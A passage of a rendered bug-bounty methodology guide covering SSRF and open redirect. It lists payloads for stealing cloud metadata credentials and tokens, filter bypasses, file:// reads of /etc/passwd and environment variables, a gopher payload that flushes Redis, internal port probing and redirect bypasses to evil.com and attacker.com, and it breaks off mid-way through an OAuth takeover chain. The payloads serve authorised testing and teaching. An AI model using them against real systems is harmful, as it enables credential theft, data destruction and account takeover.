+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>?url<span class="o">=</span>http://169.254.169.254/latest/meta-data/local-ipv4
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">aws_imdsv2.sh</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># IMDSv2 requires a PUT to get a token first</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># If SSRF allows PUT or app follows redirects, host a redirect server:</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># your-redirect-server.com/redirect → 302 → http://169.254.169.254/latest/meta-data/...</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c1"># Most SSRF implementations follow redirects → bypasses IMDSv2 in practice</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">gcp_metadata.sh</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Requires header: Metadata-Flavor: Google</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>?url<span class="o">=</span>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>?url<span class="o">=</span>http://metadata.google.internal/computeMetadata/v1/project/project-id
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>?url<span class="o">=</span>http://169.254.169.254/computeMetadata/v1/
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">azure_metadata.sh</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Requires header: Metadata: true</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>?url<span class="o">=</span>http://169.254.169.254/metadata/instance?api-version<span class="o">=</span><span class="m">2021</span>-02-01
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>?url<span class="o">=</span>http://169.254.169.254/metadata/identity/oauth2/token?resource<span class="o">=</span>https://management.azure.com/
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">other_metadata.sh</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># DigitalOcean:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>?url<span class="o">=</span>http://169.254.169.254/metadata/v1.json
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Alibaba Cloud:</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>?url<span class="o">=</span>http://100.100.100.200/latest/meta-data/
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># Generic alternate metadata IP:</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>?url<span class="o">=</span>http://192.0.0.1/latest/meta-data/
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition danger">
+<p class="admonition-title">In the report</p>
+<p>Show the credential response structure — AccessKeyId prefix is sufficient, not the full secret. State what the IAM role's permissions allow. Most programs treat credential theft via SSRF as Critical with immediate payout.</p>
+</div>
+<hr />
+<h3 id="513-ssrf-filter-bypass">5.1.3 SSRF Filter Bypass<a class="headerlink" href="#513-ssrf-filter-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>When the app blocks <code>169.254.169.254</code> or <code>localhost</code>:</strong></p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:4"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><input id="__tabbed_2_3" name="__tabbed_2" type="radio" /><input id="__tabbed_2_4" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">IP encoding</label><label for="__tabbed_2_2">DNS-based</label><label for="__tabbed_2_3">Protocol bypass</label><label for="__tabbed_2_4">Parser tricks</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">ip_encoding.sh</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Decimal:</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>http://2130706433/<span class="w">      </span><span class="c1"># 127.0.0.1</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>http://2852039166/<span class="w">      </span><span class="c1"># 169.254.169.254</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># Octal:</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>http://0177.0.0.1/
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>http://0251.0376.0251.0376/
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># Hex:</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>http://0x7f000001/<span class="w">      </span><span class="c1"># 127.0.0.1</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>http://0xa9fea9fe/<span class="w">      </span><span class="c1"># 169.254.169.254</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="c1"># Shorthand:</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>http://127.1/
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>http://0/<span class="w">               </span><span class="c1"># resolves to 0.0.0.0</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="c1"># IPv6:</span>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>http://<span class="o">[</span>::1<span class="o">]</span>/
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>http://<span class="o">[</span>::ffff:169.254.169.254<span class="o">]</span>/
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>http://<span class="o">[</span>::ffff:a9fe:a9fe<span class="o">]</span>/
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">dns_bypass.sh</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># nip.io — resolves to embedded IP:</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>http://127.0.0.1.nip.io/
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>http://169.254.169.254.nip.io/
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Redirect server (most reliable):</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1"># Host on your server: Location: http://169.254.169.254/latest/meta-data/...</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>?url<span class="o">=</span>http://your-redirect-server.com/to-metadata
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c1"># App fetches your server → 302 → follows to metadata endpoint</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">protocol_bypass.sh</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># File read (if HTTP blocked):</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>file:///etc/passwd
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>file:///proc/self/environ
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>file:///app/config/database.yml
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># Gopher (arbitrary TCP — useful for Redis, Memcache):</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># Dict protocol:</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>dict://internal-service:11211/info
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">parser_tricks.sh</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># @ separator — some parsers use part before @ as credentials:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>http://attacker@169.254.169.254/
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>http://169.254.169.254#@target.com
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># Double URL encoding:</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>http://%2561%2562%2563.attacker.com
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c1"># Null byte:</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>http://169.254.169.254%00.target.com
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="c1"># Port variation:</span>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>http://169.254.169.254:80/latest/meta-data/
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="514-internal-port-scanning">5.1.4 Internal Port Scanning<a class="headerlink" href="#514-internal-port-scanning" title="Permanent link">&para;</a></h3>
+<p>Once SSRF is confirmed, use it to map the internal network. Response time and content differences reveal open ports.</p>
+<div class="language-bash highlight"><span class="filename">internal_portscan.sh</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Burp Intruder setup:</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># Position: http://127.0.0.1:§PORT§/</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># Payload: port number list below</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1"># Grep: response time difference, content, &quot;connection refused&quot; vs. timeout</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="c1"># High-value ports to probe:</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="c1"># 6379  Redis (unauthenticated by default)</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="c1"># 9200  Elasticsearch (unauthenticated by default)</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c1"># 27017 MongoDB (unauthenticated by default)</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="c1"># 11211 Memcached</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="c1"># 8080  Alternate HTTP (internal admin)</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="c1"># 8888  Jupyter Notebook</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="c1"># 3306  MySQL</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="c1"># 5432  PostgreSQL</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="c1"># 2375  Docker API (unauthenticated)</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">high_value_internal.sh</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Elasticsearch — data access:</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>?url<span class="o">=</span>http://127.0.0.1:9200/_cat/indices
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>?url<span class="o">=</span>http://127.0.0.1:9200/_all/_search
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c1"># Kubernetes API (if running in K8s):</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>?url<span class="o">=</span>http://10.96.0.1:443/api/v1/namespaces/default/secrets
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>?url<span class="o">=</span>http://kubernetes.default.svc/api/v1/pods
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="c1"># Prometheus metrics:</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>?url<span class="o">=</span>http://127.0.0.1:9090/metrics
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="c1"># Internal admin panels:</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>?url<span class="o">=</span>http://127.0.0.1:8080/admin
+</span></code></pre></div>
+<p><strong>Interpreting responses:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Response</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Fast response + content</td>
+<td>Port open, service running</td>
+</tr>
+<tr>
+<td>"Connection refused"</td>
+<td>Port closed</td>
+</tr>
+<tr>
+<td>Timeout</td>
+<td>Filtered or no service</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="515-ssrf-feature-checklist">5.1.5 SSRF Feature Checklist<a class="headerlink" href="#515-ssrf-feature-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>□ URL/link/src/href/webhook parameters → interactsh callback
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>□ &quot;Import from URL&quot; features (CSV, RSS, data import)
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>□ Link unfurling / URL preview features
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>□ Profile picture / avatar URL field
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>□ PDF / document export with HTML content
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>□ OAuth callback URL fields (if validated via fetch)
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>□ Image resize / thumbnail generation from URL
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>□ Email HTML content rendered server-side
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>□ XML/SOAP inputs with DTD or schema URLs
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>□ Server health check / monitoring endpoints
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>□ Proxy / relay features (anonymizer, preview services)
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>□ Collaboration features that fetch external resources
+</span></code></pre></div>
+<hr />
+<h2 id="52-open-redirect">5.2 Open Redirect<a class="headerlink" href="#52-open-redirect" title="Permanent link">&para;</a></h2>
+<p>The application redirects users to a URL taken from user input without validating the destination. Standalone severity is Low–Medium. Chained with OAuth or SSRF it becomes High.</p>
+<p><strong>The reporting trap:</strong> Hunters report standalone open redirects and get Informational. Always spend 15 minutes trying to chain before submitting.</p>
+<h3 id="521-detection">5.2.1 Detection<a class="headerlink" href="#521-detection" title="Permanent link">&para;</a></h3>
+<p><strong>Parameters to look for:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>?next=   ?url=      ?redirect=   ?redirect_uri=   ?return=
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>?returnto=   ?return_url=   ?goto=   ?destination=
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>?redir=   ?r=   ?u=   ?link=   ?target=
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>?continue=   ?forward=   ?callback=   ?go=
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">redirect_probe.sh</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Use a clearly distinct domain:</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>?next<span class="o">=</span>https://evil.com
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Check Location header:</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>curl<span class="w"> </span>-sv<span class="w"> </span><span class="s2">&quot;https://target.com/login?next=https://evil.com&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;location:&quot;</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="c1"># Location: https://evil.com → confirmed</span>
+</span></code></pre></div>
+<hr />
+<h3 id="522-bypass-techniques">5.2.2 Bypass Techniques<a class="headerlink" href="#522-bypass-techniques" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">redirect_bypass.sh</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Protocol-relative (inherits current scheme):</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>?next<span class="o">=</span>//evil.com
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>?next<span class="o">=</span>////evil.com
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># @ separator (parsers use different parts as host):</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>?next<span class="o">=</span>https://target.com@evil.com
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>?next<span class="o">=</span>https://evil.com@target.com
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="c1"># Backslash (browser normalizes to /):</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>?next<span class="o">=</span>https://evil.com<span class="se">\t</span>arget.com
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>?next<span class="o">=</span>//evil.com<span class="se">\@</span>target.com
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="c1"># Subdomain confusion:</span>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>?next<span class="o">=</span>https://target.com.evil.com
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>?next<span class="o">=</span>https://evilcom.target.com.attacker.com
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="c1"># Fragment:</span>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>?next<span class="o">=</span>https://evil.com%23target.com<span class="w">    </span><span class="c1"># evil.com#target.com</span>
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>?next<span class="o">=</span>https://evil.com%3F.target.com<span class="w">   </span><span class="c1"># evil.com?.target.com</span>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>
+</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a><span class="c1"># Unicode:</span>
+</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>?next<span class="o">=</span>https://evil%E3%80%82com<span class="w">        </span><span class="c1"># unicode fullstop</span>
+</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>
+</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="c1"># Double encoding:</span>
+</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>?next<span class="o">=</span>https%3A%2F%2Fevil.com
+</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>
+</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a><span class="c1"># Parameter pollution:</span>
+</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>?next<span class="o">=</span>https://target.com<span class="p">&amp;</span><span class="nv">next</span><span class="o">=</span>https://evil.com
+</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>
+</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="c1"># Null byte (truncates validation in some languages):</span>
+</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>?next<span class="o">=</span>https://evil.com%00.target.com
+</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>
+</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a><span class="c1"># Whitelisted domain as path:</span>
+</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>?next<span class="o">=</span>https://evil.com/https://target.com
+</span></code></pre></div>
+<hr />
+<h3 id="523-chaining-open-redirect">5.2.3 Chaining Open Redirect<a class="headerlink" href="#523-chaining-open-redirect" title="Permanent link">&para;</a></h3>
+<p><strong>Chain 1 — Open Redirect + OAuth = ATO:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>OAuth validates redirect_uri must start with: https://target.com/callback
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Open redirect exists at: https://target.com/goto?url=
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>Craft:
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>redirect_uri=https://target.com/goto?url=https://attacker.com
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>Flow:
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>1. Victim clicks OAuth link
